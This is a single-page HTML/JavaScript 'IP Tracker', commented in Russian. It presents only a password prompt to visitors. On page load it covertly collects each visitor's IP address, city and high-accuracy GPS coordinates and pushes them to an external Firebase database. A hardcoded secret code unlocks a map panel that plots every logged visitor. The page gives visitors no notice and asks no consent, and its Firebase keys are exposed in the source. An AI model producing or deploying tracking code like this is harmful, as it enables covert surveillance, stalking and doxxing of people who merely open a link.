<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate IP Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { background: #141414; padding: 20px; border-radius: 20px; width: 95vw; height: 90vh; border: 1px solid #333; display: flex; flex-direction: column; position: relative; }
        .hidden { display: none !important; }
        
        /* Сетка админки */
        .admin-layout { display: grid; grid-template-columns: 300px 1fr; gap: 15px; flex-grow: 1; height: 100%; min-height: 0; }
        
        /* Стили карты */
        #map-container { position: relative; width: 100%; height: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #007bff; }
        #map { position: absolute; top: 0; bottom: 0; left: 0; right: 0; width: 100%; height: 100%; }
        
        /* Список логов */
        #logs { overflow-y: auto; background: #000; padding: 10px; border-radius: 15px; border: 1px solid #222; height: 100%; box-sizing: border-box; }
        .log-item { background: #1a1a1a; margin-bottom: 8px; padding: 10px; border-radius: 8px; border-left: 4px solid #007bff; cursor: pointer; font-size: 13px; transition: 0.2s; }
        .log-item:hover { background: #252525; border-left-color: #00ff88; }
        
        /* Кнопки и инпуты */
        .login-box { text-align: center; margin: auto; }
        button { background: #007bff; color: white; border: none; padding: 12px 25px; cursor: pointer; border-radius: 8px; font-weight: bold; }
        input { padding: 12px; width: 250px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; text-align: center; font-size: 16px; margin-bottom: 10px; }
        
        .method-gps { color: #00ff88; font-weight: bold; font-size: 10px; }
        .method-ip { color: #888; font-size: 10px; }
    </style>
</head>
<body>

<div class="container">
    <div id="code-step" class="login-box">
        <h2 style="color: #007bff;">Terminal Access</h2>
        <input type="password" id="accessCode" placeholder="SECRET CODE">
        <br>
        <button onclick="checkCode()">ENTER SYSTEM</button>
    </div>

    <div id="result-step" class="hidden" style="height: 100%; flex-direction: column; display: flex;">
        <h3 style="margin: 0 0 10px 0; color: #007bff; display: flex; justify-content: space-between;">
            System Monitor <span><button onclick="location.reload()" style="padding: 2px 10px; font-size: 12px;">Logout</button></span>
        </h3>
        <div class="admin-layout">
            <div id="logs">Connecting to Database...</div>
            <div id="map-container">
                <div id="map"></div>
            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
        authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
        projectId: "flutter-ai-playground-caf0d", 
        storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
        messagingSenderId: "155816311480", 
        appId: "1:155816311480:web:a0456fcc4681e62837924d",
        databaseURL: "https://cheatip-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_CODE = "HTMLKODEYOURIP";
    let map, markers = {};

    // 1. МГНОВЕННЫЙ СБОР ПРИ ЗАХОДЕ
    async function collectData() {
        try {
            // Сначала по IP
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            
            const pushData = (lat, lng, m) => {
                push(ref(db, 'visits'), {
                    ip: ipData.ip || "Unknown",
                    city: ipData.city || "Unknown",
                    lat: lat,
                    lng: lng,
                    method: m,
                    time: new Date().toLocaleString('ru-RU'),
                    timestamp: serverTimestamp()
                });
            };

            pushData(ipData.latitude, ipData.longitude, "IP");

            // Затем пытаемся GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => pushData(p.coords.latitude, p.coords.longitude, "GPS"),
                    null, { enableHighAccuracy: true }
                );
            }
        } catch (e) { console.log("Silent error"); }
    }
    collectData();

    // 2. ВХОД
    window.checkCode = function() {
        if (document.getElementById('accessCode').value === SECRET_CODE) {
            document.getElementById('code-step').classList.add('hidden');
            const resStep = document.getElementById('result-step');
            resStep.classList.remove('hidden');
            resStep.style.display = 'flex';
            
            // Инициализация карты с задержкой, чтобы контейнер успел появиться
            setTimeout(initMap, 400);
        } else {
            alert("Wrong Code");
        }
    }

    function initMap() {
        if (map) return;
        map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; CartoDB'
        }).addTo(map);
        
        // КРИТИЧЕСКИЙ ФИКС БАГА: заставляем карту обновить размер
        setTimeout(() => { map.invalidateSize(); }, 200);
        
        loadData();
    }

    function loadData() {
        onValue(ref(db, 'visits'), (snapshot) => {
            const data = snapshot.val();
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML = '';
            
            if (!data) return;

            const entries = Object.entries(data);
            entries.forEach(([key, user], index) => {
                const num = index + 1;
                const isGPS = user.method === "GPS";
                
                // Элемент списка
                const div = document.createElement('div');
                div.className = 'log-item';
                div.innerHTML = `
                    <b>#${num}</b> ${isGPS ? '<span class="method-gps">[GPS]</span>' : '<span class="method-ip">[IP]</span>'}<br>
                    <span style="color:#00ff88">${user.ip}</span><br>
                    ${user.city} | <small>${user.time}</small>
                `;
                
                // Клик - летим к маркеру
                div.onclick = () => {
                    map.flyTo([user.lat, user.lng], 15, { duration: 1.5 });
                };
                
                logsDiv.prepend(div);

                // Ставим маркер
                if (!markers[key]) {
                    markers[key] = L.marker([user.lat, user.lng])
                        .addTo(map)
                        .bindPopup(`User #${num}<br>IP: ${user.ip}<br>Source: ${user.method}`);
                }
            });
        });
    }
</script>

</body>
</html>
